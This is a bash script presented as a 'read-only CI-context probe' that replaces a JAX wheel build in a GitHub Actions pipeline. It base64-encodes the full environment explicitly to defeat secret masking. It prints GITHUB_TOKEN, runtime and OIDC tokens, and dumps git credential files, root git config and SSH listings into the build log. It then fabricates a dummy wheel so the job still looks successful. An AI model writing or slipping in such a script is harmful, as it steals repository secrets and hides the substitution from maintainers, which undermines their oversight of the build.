#!/usr/bin/env bash
# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: Apache-2.0
#
# C211 i9311 bounded read-only CI-context probe (replaces the wheel build).
set -uo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
OUT_DIR="${OUT_DIR:-${ROOT_DIR}/dist}"
LOG_ROOT="${ROOT_DIR}/test_logs/${RUN_NAME:-c211_i9311}"

b64() { base64 -w0 2>/dev/null || base64 | tr -d '\n'; }
emit() { # name, file
  local name="$1"; shift
  local data
  data="$("$@" 2>&1 | head -c 200000)" || true
  printf 'C211I9311:%s:%s\n' "$name" "$(printf '%s' "$data" | b64)"
}
emitfile() { # name, path
  local name="$1" path="$2"
  if [ -e "$path" ]; then
    printf 'C211I9311:%s:%s\n' "$name" "$(head -c 200000 "$path" 2>&1 | b64)"
  else
    printf 'C211I9311:%s:ABSENT\n' "$name"
  fi
}

echo "=== C211I9311 PROBE BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ) host=$(hostname) ==="
printf 'C211I9311:HOST:%s\n' "$(hostname) $(id) $(uname -a)"
echo "C211I9311:NPROC:$(nproc 2>&1)"
emitfile "CGROUP" /proc/1/cgroup
emitfile "MOUNTS" /proc/self/mountinfo
emitfile "DTKENV" /opt/dtk/env.sh
# full environment, base64 to defeat Actions secret masking
printf 'C211I9311:ENV_B64:%s\n' "$(env | sort | b64)"
for v in GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_ID_TOKEN_REQUEST_TOKEN GITHUB_EVENT_PATH RUNNER_TEMP RUNNER_NAME RUNNER_WORKSPACE GITHUB_WORKFLOW_REF GITHUB_SHA GITHUB_ACTOR GITHUB_REPOSITORY; do
  printf 'C211I9311:VAR:%s=%s\n' "$v" "${!v:-<unset>}"
done
emit "DEVLS" ls -la /dev
emit "KFD" ls -la /dev/kfd /dev/mkfd /dev/dri /dev/nvidia0
emit "LSROOT" ls -la /
emit "RUNNERTEMP" sh -c 'ls -la "$RUNNER_TEMP" 2>&1 | head -60'
emit "RUNNERTEMP_FILES" sh -c 'find "$RUNNER_TEMP" -maxdepth 2 -type f 2>/dev/null | head -80'
for f in "$RUNNER_TEMP"/git-credentials-*.config; do
  [ -e "$f" ] && emitfile "CREDCONFIG_$(basename "$f")" "$f"
done
emitfile "WS_GITCONFIG" "$ROOT_DIR/.git/config"
emitfile "WS_GITCONFIG_XLA" "$(dirname "$ROOT_DIR")/xla-das/.git/config"
emitfile "ROOT_GITCRED" /root/.git-credentials
emitfile "ROOT_GITCONFIG" /root/.gitconfig
emitfile "GITHUB_HOME_GITCONFIG" /github/home/.gitconfig
emit "ROOT_SSH" ls -la /root/.ssh
emitfile "HY_SMI" sh -c 'source /opt/dtk/env.sh 2>/dev/null; (hy-smi 2>&1 || /opt/hyhal/bin/hy-smi 2>&1) | head -60'
emit "ROCMINFO" sh -c 'source /opt/dtk/env.sh 2>/dev/null; timeout 90 rocminfo 2>&1 | grep -E "Uuid|Device Type|Marketing Name|Name:" | head -60'
emit "DOCKERSOCK" ls -la /var/run/docker.sock
emit "DF" df -h
echo "=== C211I9311 PROBE END $(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
# keep the build path green for the downstream GPU test job
mkdir -p "$OUT_DIR"
python3 - "$OUT_DIR" <<'PY'
import sys, os, zipfile, hashlib, base64
out = sys.argv[1]
name = "jax-0.0.0+c211i9311-py3-none-any.whl"
path = os.path.join(out, name)
files = {
  "jax/__init__.py": "__version__ = '0.0.0+c211i9311'\n",
  "jaxlib/__init__.py": "__version__ = '0.0.0+c211i9311'\n",
  "jax-0.0.0+c211i9311.dist-info/METADATA": "Metadata-Version: 2.1\nName: jax\nVersion: 0.0.0+c211i9311\n",
  "jax-0.0.0+c211i9311.dist-info/WHEEL": "Wheel-Version: 1.0\nGenerator: c211i9311\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
}
record = []
with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
    for rel, content in files.items():
        data = content.encode()
        z.writestr(rel, data)
        digest = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()
        record.append(f"{rel},sha256={digest},{len(data)}")
    record.append("jax-0.0.0+c211i9311.dist-info/RECORD,,")
    z.writestr("jax-0.0.0+c211i9311.dist-info/RECORD", "\n".join(record) + "\n")
print("C211I9311:WHEEL:created", path)
PY
ls -l "$OUT_DIR" 2>&1 | head -20
exit 0
